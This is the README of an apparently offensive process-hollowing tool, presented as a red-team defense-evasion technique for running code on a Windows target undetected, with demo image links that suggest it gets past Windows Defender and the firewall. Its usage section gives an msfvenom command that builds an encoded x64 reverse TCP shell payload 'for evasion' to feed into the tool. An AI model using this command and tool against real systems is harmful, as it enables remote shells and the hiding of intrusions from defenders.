# Process-Hollowing-RedTeamOps
## Red Team Operation's Defense Evasion Technique for executing without raising flags on Target System.

# ***Made With ❤️ in 🇮🇳!!!***

### Credit of these Images goes to to their respective creators :relaxed:!!

![hollowing1-1_](https://github.com/vatsalgupta67/Process-Hollowing-RedTeamOps/assets/71017420/dd3cbd07-ebf0-447e-82f7-9b71384f9b00) 

![491809_1_En_10_Fig27_HTML](https://github.com/vatsalgupta67/Process-Hollowing-RedTeamOps/assets/71017420/f972fda2-6e65-4bb8-86e5-5f984619f8fe)


![90540-1sncmwnz19drbfqzllk_d5w](https://github.com/vatsalgupta67/Process-Hollowing-RedTeamOps/assets/71017420/cdcee61d-1672-4bf6-9acc-2b952747e1cf)



We have both x86 and x64 bit release as you want. **we strongly suggest x64-but release if you're bit confused about compiling manually**

We suggest to use directly compiled executables as in some situations it depends on your compiler.


**If you wish to Compile x64 bit relese on Kali with cross-compiler - x86_64-w64-mingw32-gcc** 

**For 32-bit - Mingw for Windows**

# Index

* [Demo](https://github.com/vatsalgupta67/Process-Hollowing-RedTeamOps/blob/main/README.md#demo)

* [How to use](https://github.com/vatsalgupta67/Process-Hollowing-RedTeamOps/blob/main/README.md#how-to-use)

## Tools Resources and skills used 

1. ChatGPT for required Windows API.
2. Visual Studio Code - Linux and Windows.
3. Cross-compiler.
4. Process-Hollowing Technique working.

6. Deep-imagination .
7. Error-handling.
8. Programming Skills.
9. Time.
10. Defeating Faliures.
11. Tons of Research.
12. Dedication.
13. Smart Work.

## Demo

![windows-hollow](https://github.com/vatsalgupta67/Process-Hollowing-RedTeamOps/assets/71017420/cbc55b11-94c1-4416-a200-43f76abc9baf)

![kali](https://github.com/vatsalgupta67/Process-Hollowing-RedTeamOps/assets/71017420/4a258dcc-0f40-4ec7-9422-1422a97686c9)

![win-update](https://github.com/vatsalgupta67/Process-Hollowing-RedTeamOps/assets/71017420/a9421032-566d-49f0-a0a0-9857395a5624)


![firewall](https://github.com/vatsalgupta67/Process-Hollowing-RedTeamOps/assets/71017420/96c3d3cd-6708-4640-83f0-e44c4a642907)


![windef-2](https://github.com/vatsalgupta67/Process-Hollowing-RedTeamOps/assets/71017420/ca002758-e1e4-43b3-be87-7a59242f80f5)

![windows-def](https://github.com/vatsalgupta67/Process-Hollowing-RedTeamOps/assets/71017420/dc8b587a-10f4-4408-8203-539640b50cde)

# How to use

***1. Generate a .bin file only - You can use C2 servers and metasploit too or any you want***

Example - msfvenom -p windows/x64/shell_reverse_tcp LHOST<IP> LPORT<PORT> -f raw -i <iterations as you want for evasion> -e <encoder you want to use> > shell.bin - **x64-Bit**
  
 ***2. Obfuscation is mainly your work to do as per your operations. The other one's? - WE'LL HANDLE!!!***
  
  
